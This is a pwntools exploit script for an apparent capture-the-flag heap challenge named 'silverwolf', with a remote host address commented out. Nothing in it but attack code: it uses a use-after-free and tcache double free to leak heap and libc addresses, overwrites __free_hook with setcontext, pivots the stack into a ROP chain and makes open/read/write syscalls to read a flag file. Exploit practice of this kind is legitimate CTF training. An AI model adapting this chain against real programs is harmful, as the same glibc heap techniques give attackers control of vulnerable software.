from os import environ
from pwn import *
context(arch = "amd64", os = "Linux", log_level = "Debug")
context.terminal = ['tmux','splitw','-h']
io = process("./silverwolf")
# io = remote("124.70.130.92", 60001)
# gdb.attach(io)

s       = lambda data               :io.send(data)
sa      = lambda delim,data         :io.sendafter(str(delim), data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(str(delim), data)
r       = lambda num=4096           :io.recv(num)
ru      = lambda delims             :io.recvuntil(delims)
rl      = lambda                    :io.recvline()
itr     = lambda                    :io.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

def add(size):
    ru("Your choice: ")
    sl("1")
    ru("Index: ")
    sl("0")
    ru("Size: ")
    sl(str(size))

def edit(content):
    ru("Your choice: ")
    sl("2")
    ru("Index: ")
    sl("0")
    ru("Content: ")
    sl(content)

def show():
    ru("Your choice: ")
    sl("3")
    ru("Index: ")
    sl("0")
    ru("Content: ")

def delete():
    ru("Your choice: ")
    sl("4")
    ru("Index: ")
    sl("0")

for i in range(8):
    add(0x78)
#chunk B
add(0x38)
#write prev_size of extended tcache info chunk
edit("A" * 8 * 6 + p64(0x430))

#self-looped, address in chunk
#show after delete(UAF)
#leak the heap addr
add(0x20)
delete()
delete()
show()
heap_addr = u64(rl()[:6].ljust(8, "\0"))
heap_base_addr = heap_addr - 0x440
log.info("Heap addr (add offset 0x440) : " + hex(heap_base_addr))


#edit pointer to point to heap base addr to edit size field
edit(p64(heap_base_addr))
#alloc middle chunks
add(0x20)
#alloc tcache info chunk(size:0x260)
#because it is big enough to alloc a small chunk
add(0x20)
#edit size to 0x431, to the head of chunk A
#! make sure the prev is inuse!!!(the first one)
#! to avoid forward consolidate
edit(p64(0) + p64(0x431))
#edit chunk B prev_size field to bypass checking


#prepare to alloc extended tcache info chunk
add(0x10)
delete()
delete()
edit(p64(heap_base_addr + 16))
add(0x10)
add(0x10)
delete()
show()
main_arena_addr = u64(rl()[:6].ljust(8, '\0')) - 96
libc_addr = main_arena_addr - 0x3ebc40
log.info("libc address : " + hex(libc_addr))

#symbols
free_hook = libc_addr + 0x3ed8e8
setcontext = libc_addr + 0x520A5
syscall_ret = libc_addr + 0xd2975
pop_rdi = libc_addr + 0x2155f
pop_rsi = libc_addr + 0x23e6a
pop_rdx = libc_addr + 0x1b96
pop_rax = libc_addr + 0x439c8
mov_rax_1 = libc_addr + 0xd0e30
nop_ret = libc_addr + 0x1d58f0

add(0x48)
delete()
delete()
show()
string_addr = u64(rl()[:6].ljust(8, '\0'))
edit("./flag.txt")

for i in range(8):
    add(0x58)
for i in range(8):
    add(0x38)
for i in range(11):
    add(0x68)

add(0x58)
edit(p64(0)*11)
delete()
add(0x38)
edit(p64(0)*7)
#rop chain in heap
add(0x78)
delete()
delete()
show()
context_addr = u64(rl()[:6].ljust(8, '\0'))
context1  = p64(context_addr + 0x8) + p64(nop_ret)
context1 += p64(pop_rdi) + p64(string_addr) + p64(pop_rsi) + p64(0)
context1 += p64(pop_rax) + p64(2) + p64(syscall_ret)
context1 += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(string_addr)
context1 += p64(nop_ret) + p64(pop_rdx)
edit(context1)
#pause()
context2  = p64(pop_rdx) + p64(0x20) + p64(pop_rax) + p64(0)
context2 += p64(syscall_ret) + p64(pop_rdi) + p64(1) + p64(pop_rsi)
context2 += p64(string_addr) + p64(pop_rdx) + p64(0x20) + p64(mov_rax_1)
context2 += p64(syscall_ret)
add(0x68)
edit(context2)
#pause()
#edit free hook
add(0x68)
delete()
delete()
edit(p64(free_hook))
add(0x68)
add(0x68)
edit(p64(setcontext))

#run free hook, hijack rsp to heap chunk to run rop chain
add(0x58)
log.info("context_addr : " + hex(context_addr))
delete()
print(rl())
